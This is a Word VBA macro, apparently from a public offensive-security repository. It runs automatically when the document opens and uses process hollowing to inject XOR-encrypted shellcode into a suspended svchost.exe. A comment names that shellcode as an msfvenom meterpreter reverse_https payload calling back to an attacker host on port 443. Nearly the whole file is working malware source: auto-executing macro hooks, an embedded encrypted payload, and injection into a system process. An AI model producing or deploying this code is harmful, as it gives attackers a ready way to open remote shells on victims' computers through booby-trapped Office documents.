' Source: https://github.com/ColeHouston/word-vba-process-hollowing

#If Win64 Then
    Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#Else
    Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#End If

Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Document_Open()
    hollow
End Sub

Sub AutoOpen()
    hollow
End Sub

' Performs process hollowing to run shellcode in svchost.exe
Function hollow()
    Dim si As STARTUPINFOA
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    ' Start svchost.exe in a suspended state
    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
    
    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
    Dim ProcInfo As LongPtr
    ProcInfo = pi.hProcess
    Dim PEBinfo As LongPtr

#If Win64 Then
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 16
    Dim AddrBuf(7) As Byte
#Else
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 8
    Dim AddrBuf(3) As Byte
#End if

    Dim tmp As Long
    tmp = 0
#If Win64 Then
    ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
    svcHostBase = AddrBuf(7) * (2 ^ 56)
    svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
    svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
    svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)
    svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#Else
    ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
    svcHostBase = AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#End if

    Dim data(512) As Byte
    ' Read more data from PEB so e_lfanew offset can be retrieved
    readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
    
    ' Read e_lfanew offset value and add 40
    Dim e_lfanew_offset As Long
    e_lfanew_offset = data(60)

    Dim opthdr As Long
    opthdr = e_lfanew_offset + 40
    
    ' Construct relative virtual address for svchost's entry point
    Dim entrypoint_rva As Long
    entrypoint_rva = data(opthdr + 3) * (2 ^ 24)
    entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)
    entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)
    entrypoint_rva = entrypoint_rva + data(opthdr)

    Dim addressOfEntryPoint As LongPtr
    ' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode
    addressOfEntryPoint = entrypoint_rva + svcHostBase
    
    ' Buffer for malicious crypted shellcode needs to go here
    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "CHANGEMYKEY"

' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'
sc = Array(191,160,206,78,71,69,45,104,153,33,210,17,120,202,28,75,206,31,77,194,160,86,244,2,103,127,184,206,63,113,122,133,245,127,41,61,76,107,101,140,150,70,68,158,10,61,174,28,16,206,31,73,192,7,101,66,152,202,14,63,192,141,45,7,68,137,200,16,97,197,15,93,76,138,27,192,144,55,116,112,177, _
14,206,121,210,74,147,104,131,228,128,129,74,68,138,97,171,48,173,64,53,185,117,58,97,56,185,19,206,1,103,73,146,40,204,73,6,210,19,89,88,144,195,69,197,70,149,196,29,111,97,2,24,41,24,20,22,186,173,1,20,31,210,81,161,193,177,184,186,16,49,37,32,45,67,32,54,39,41,44,25, _
49,7,50,127,68,183,148,127,156,22,30,10,24,22,177,18,72,65,78,10,42,55,48,39,41,56,108,125,111,126,103,109,26,48,37,33,54,52,59,97,0,19,101,124,105,101,117,98,99,31,40,32,113,113,118,121,51,115,109,120,104,51,56,125,116,126,106,101,117,112,99,15,36,45,44,42,98,107,123,116, _
105,115,121,113,127,103,3,36,43,46,35,54,59,103,112,125,116,107,125,89,35,127,15,58,239,190,155,20,22,39,90,24,22,49,184,104,65,78,175,243,77,89,75,106,9,5,127,35,1,37,63,21,1,27,55,97,113,46,114,23,43,29,26,105,127,4,13,54,37,6,57,24,17,53,47,121,23,108,13,60, _
37,78,23,45,26,208,212,131,166,150,193,135,29,47,69,127,177,207,22,10,16,31,18,24,47,174,24,119,112,186,140,213,34,75,17,47,197,126,89,75,204,185,41,76,17,36,88,19,37,44,13,219,223,188,157,18,29,20,22,27,49,102,67,65,56,183,148,203,135,48,89,49,195,86,89,67,32,5,190,114, _
165,178,140,4,48,148,171,3,65,78,71,47,13,49,75,85,89,67,32,65,78,7,69,30,49,19,225,10,166,183,148,221,20,22,196,190,28,45,89,99,72,65,29,17,45,95,207,194,167,166,150,205,129,58,136,206,74,88,136,192,153,54,173,25,141,24,173,38,166,180,186,104,122,122,111,127,113,125,99,109, _
126,107,104,116,125,65,245,167,88,103,83,35,227,204,254,213,190,155,123,67,49,83,203,190,185,54,77,250,9,84,55,34,51,75,22,166,150)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x
    
    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(525) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y
    
    ' Write the shellcode into the svchost.exe entry point
    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
    ' Resume svchost.exe process to run the shellcode
    b = ResumeThread(pi.hThread)
 
End Function
